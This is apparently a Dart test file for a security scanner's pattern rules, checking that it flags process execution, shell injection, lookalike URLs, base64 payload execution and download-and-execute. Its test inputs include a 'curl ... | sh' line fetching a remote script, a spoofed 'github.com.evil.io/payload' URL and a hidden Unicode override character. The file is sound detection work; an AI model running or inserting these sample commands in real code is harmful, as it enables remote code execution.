/*
 * Copyright 2026 Davils
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import 'package:inspectra/inspectra.dart';
import 'package:inspectra/src/inspect/regex_scanner.dart';
import 'package:test/test.dart';

import '../support/entries.dart';

/// Tests the pattern rules of the source inspector.
void main() {
  /// Scans one Dart file with [content] and returns the rule ids.
  List<String> rulesFor(String content, {String path = 'lib/a.dart'}) {
    final List<Finding> findings = RegexScanner(
      excludedDirectories: const <String>['test'],
    ).scan([textEntry(path, content)]);
    return findings.map((f) => f.ruleId).toList();
  }

  test('detects process execution and shell invocation', () {
    expect(
      rulesFor("Process.run('bash', ['-c', cmd]);"),
      containsAll(<String>['PROCESS_RUN', 'SHELL_INJECTION']),
    );
    expect(rulesFor('Process.runSync(x, []);'), contains('PROCESS_RUN'));
  });

  test('checks URL hosts exactly instead of by prefix', () {
    expect(rulesFor("final u = 'https://github.com/dart-lang/x';"), isEmpty);
    expect(
      rulesFor("final u = 'https://github.com.evil.io/payload';"),
      contains('HARDCODED_URL'),
    );
    expect(rulesFor("final u = 'https://api.pub.dev/v1';"), isEmpty);
    expect(rulesFor("final u = 'http://host.invalid/x';"), isEmpty);
  });

  test('ignores URLs in comments and in prose messages', () {
    expect(rulesFor('// see https://evil.example.net/docs'), isEmpty);
    expect(
      rulesFor(
        "throw StateError('Read more at https://developer.mozilla.org/x');",
      ),
      isEmpty,
    );
  });

  test('matches whole file rules across lines', () {
    const code = '''
final bytes = base64Decode(payload);
final iso = await Isolate.spawn(run, bytes);
''';
    expect(rulesFor(code), contains('BASE64_EVAL'));
  });

  test('skips excluded directories and binary files', () {
    expect(rulesFor('Process.run(x, []);', path: 'test/a_test.dart'), isEmpty);
  });

  test('applies script rules to shell scripts', () {
    expect(
      rulesFor('curl -s https://x.example.net/i.sh | sh', path: 'tool.sh'),
      contains('DOWNLOAD_AND_EXECUTE'),
    );
  });

  test('sanitises snippets', () {
    final List<Finding> findings = RegexScanner().scan([
      textEntry('lib/a.dart', "Process.run('sh'); \u202E"),
    ]);
    expect(findings.first.snippet, contains(r'\u{202E}'));
    expect(findings.first.severity, Severity.critical);
  });
}
